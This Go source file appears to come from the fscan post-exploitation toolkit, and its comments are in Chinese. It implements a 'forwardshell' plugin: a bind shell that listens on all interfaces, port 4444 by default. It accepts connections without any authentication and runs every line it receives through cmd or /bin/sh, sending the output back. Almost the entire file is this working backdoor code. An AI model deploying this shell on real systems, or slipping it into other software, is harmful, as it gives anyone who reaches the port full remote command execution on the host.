//go:build (plugin_forwardshell || !plugin_selective) && !no_local

package local

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// ForwardShellPlugin 正向Shell插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现Shell服务功能
// - 保持原有功能逻辑
type ForwardShellPlugin struct {
	plugins.BasePlugin
	listener net.Listener
}

// NewForwardShellPlugin 创建正向Shell插件
func NewForwardShellPlugin() *ForwardShellPlugin {
	return &ForwardShellPlugin{
		BasePlugin: plugins.NewBasePlugin("forwardshell"),
	}
}

// Scan 执行正向Shell服务 - 直接实现
func (p *ForwardShellPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	var output strings.Builder

	// 从config获取配置
	port := config.LocalExploit.ForwardShellPort
	if port <= 0 {
		port = 4444
	}

	output.WriteString("=== 正向Shell服务器 ===\n")
	output.WriteString(fmt.Sprintf("监听端口: %d\n", port))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 启动正向Shell服务器
	err := p.startForwardShellServer(ctx, port, state)
	if err != nil {
		output.WriteString(fmt.Sprintf("正向Shell服务器错误: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString("✓ 正向Shell服务已完成\n")
	common.LogSuccess(i18n.Tr("forwardshell_complete", port))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// startForwardShellServer 启动正向Shell服务器
func (p *ForwardShellPlugin) startForwardShellServer(ctx context.Context, port int, state *common.State) error {
	// 监听指定端口
	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return fmt.Errorf("监听端口失败: %w", err)
	}
	defer func() { _ = listener.Close() }()

	p.listener = listener
	common.LogSuccess(i18n.Tr("forwardshell_started", port))

	// 设置正向Shell为活跃状态
	state.SetForwardShellActive(true)
	defer func() {
		state.SetForwardShellActive(false)
	}()

	// 主循环处理连接
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// 设置监听器超时
		if tcpListener, ok := listener.(*net.TCPListener); ok {
			_ = tcpListener.SetDeadline(time.Now().Add(1 * time.Second))
		}

		conn, err := listener.Accept()
		if err != nil {
			var netErr net.Error
			if errors.As(err, &netErr) && netErr.Timeout() {
				continue
			}
			common.LogError(i18n.Tr("forwardshell_accept_failed", err))
			continue
		}

		common.LogSuccess(i18n.Tr("forwardshell_client_connected", conn.RemoteAddr().String()))
		go p.handleClient(ctx, conn)
	}
}

// handleClient 处理客户端连接
func (p *ForwardShellPlugin) handleClient(ctx context.Context, clientConn net.Conn) {
	defer func() { _ = clientConn.Close() }()

	// ctx 取消时关闭连接，解除阻塞的读操作
	go func() {
		<-ctx.Done()
		_ = clientConn.Close()
	}()

	// 发送欢迎信息
	welcome := fmt.Sprintf("FScan Forward Shell - %s\nType 'exit' to disconnect\n\n", runtime.GOOS)
	_, _ = clientConn.Write([]byte(welcome))

	// 创建命令处理器
	scanner := bufio.NewScanner(clientConn)

	for scanner.Scan() {
		command := strings.TrimSpace(scanner.Text())

		if command == "" {
			continue
		}

		if command == "exit" {
			_, _ = clientConn.Write([]byte("Goodbye!\n"))
			break
		}

		// 执行命令并返回结果
		p.executeCommand(clientConn, command)
	}

	if err := scanner.Err(); err != nil && ctx.Err() == nil {
		common.LogError(i18n.Tr("forwardshell_read_failed", err))
	}
}

// executeCommand 执行命令并返回结果
func (p *ForwardShellPlugin) executeCommand(conn net.Conn, command string) {
	var cmd *exec.Cmd

	// 根据平台创建命令
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", command)
	case "linux", "darwin":
		cmd = exec.Command("/bin/sh", "-c", command)
	default:
		_, _ = fmt.Fprintf(conn, "不支持的平台: %s\n", runtime.GOOS)
		return
	}

	// 设置命令超时
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	cmd = exec.CommandContext(ctx, cmd.Args[0], cmd.Args[1:]...)

	// 执行命令并获取输出
	output, err := cmd.CombinedOutput()

	if ctx.Err() == context.DeadlineExceeded {
		_, _ = conn.Write([]byte("命令执行超时\n"))
		return
	}

	if err != nil {
		_, _ = fmt.Fprintf(conn, "命令执行失败: %v\n", err)
		return
	}

	// 发送命令输出
	if len(output) == 0 {
		_, _ = conn.Write([]byte("(命令执行成功，无输出)\n"))
	} else {
		_, _ = conn.Write(output)
		if !strings.HasSuffix(string(output), "\n") {
			_, _ = conn.Write([]byte("\n"))
		}
	}

	// 发送命令提示符
	prompt := p.getPrompt()
	_, _ = conn.Write([]byte(prompt))
}

// getPrompt 获取平台特定的命令提示符
func (p *ForwardShellPlugin) getPrompt() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}
	if username == "" {
		username = "user"
	}

	switch runtime.GOOS {
	case "windows":
		return fmt.Sprintf("%s@%s> ", username, hostname)
	case "linux", "darwin":
		return fmt.Sprintf("%s@%s$ ", username, hostname)
	default:
		return fmt.Sprintf("%s@%s# ", username, hostname)
	}
}

// 注册插件
func init() {
	RegisterLocalPlugin("forwardshell", func() Plugin {
		return NewForwardShellPlugin()
	})
}
